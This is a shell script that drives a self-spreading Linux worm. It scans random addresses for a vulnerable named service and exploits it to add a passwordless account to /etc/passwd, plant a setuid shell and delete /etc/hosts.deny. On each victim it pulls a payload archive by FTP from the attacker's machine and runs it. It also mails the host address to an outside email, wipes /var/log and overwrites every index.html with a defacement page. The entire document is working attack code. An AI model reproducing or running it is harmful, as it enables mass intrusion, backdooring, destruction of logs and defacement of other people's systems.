EMAIL="GhostDog@EveryMail.net" 
SAY="The Agnieszka Linux Worm is here !"
PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."
export PATH


IP_A=`./gimmeIP`

cat << _EOF_ > cmd
w0rm
/tmp/.aga -c "/usr/sbin/named" &
PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."
export PATH
echo -e "<html> <body>\n$SAY\n <\html> <\\\body>" > /tmp/.X11x
cd /tmp/
mkdir .aga01
cd .aga01
if [ -f /tmp/aga ]
then
nohup /tmp/.aga -c "/bin/sleep 60;/bin/rm -rf /var/log/* /tmp/.aga" &
logout
fi
ftp $IP_A
w0rm

cd /tmp/.aga01
get Agnieszka.tgz
bye
tar xfvz Agnieszka.tgz
touch /tmp/aga
nohup ./Agnieszka &
./gimmeIP | /bin/mail $EMAIL
nohup /tmp/.aga -c "/bin/sleep 60;/bin/rm -rf /var/log/* /tmp/.aga" &
nohup find / -name "index.html" -exec /bin/cp /tmp/.X11x {} \; &
logout
_EOF_


./gimmeRAND | ./incremental  | ./scanco  | while read VICTIM
do
RESU=`./test $VICTIM 2> /dev/null | awk '{printf("%s",$3)}' 2> /dev/null`

if [ $RESU = "vulnerable." ]
then 

echo "lets hack" 
./Hnamed $VICTIM /bin/sh -c "echo >> /etc/passwd; echo \"aga::2666:777:Agnieszka Linux Worm:/:/bin/sh\" >> /etc/passwd; /bin/cp /bin/sh /tmp/.aga; /bin/chmod 4777 /tmp/.aga; /bin/rm -f /etc/hosts.deny"             
nohup ./remotecmd $VICTIM cmd 3000000  &
fi
done 
